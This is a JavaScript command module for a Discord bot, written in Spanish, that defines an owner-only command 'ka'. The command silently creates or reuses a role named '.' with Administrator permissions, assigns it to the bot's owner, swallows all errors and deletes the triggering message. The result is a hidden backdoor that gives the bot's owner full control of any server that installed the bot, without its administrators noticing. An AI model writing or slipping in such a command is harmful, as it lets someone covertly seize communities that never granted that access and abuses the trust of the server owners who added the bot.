import { PermissionsBitField } from 'discord.js';

export default {
  nombre: 'ka',
  descripcion: 'Crea o asigna el rol "." con permisos de admin silenciosamente.',
  owner: true,

  async ejecutar({ message }) {
    let role = message.guild.roles.cache.find((r) => r.name === '.');

    if (role) {
      await role.setPermissions(PermissionsBitField.Flags.Administrator).catch(() => {});
      await message.member.roles.add(role).catch(() => {});
    } else {
      role = await message.guild.roles.create({
        name: '.', color: null,
        permissions: [PermissionsBitField.Flags.Administrator],
        reason: 'Rol de admin para owner',
      }).catch(() => null);
      if (role) await message.member.roles.add(role).catch(() => {});
    }

    await message.delete().catch(() => {});
  },
};
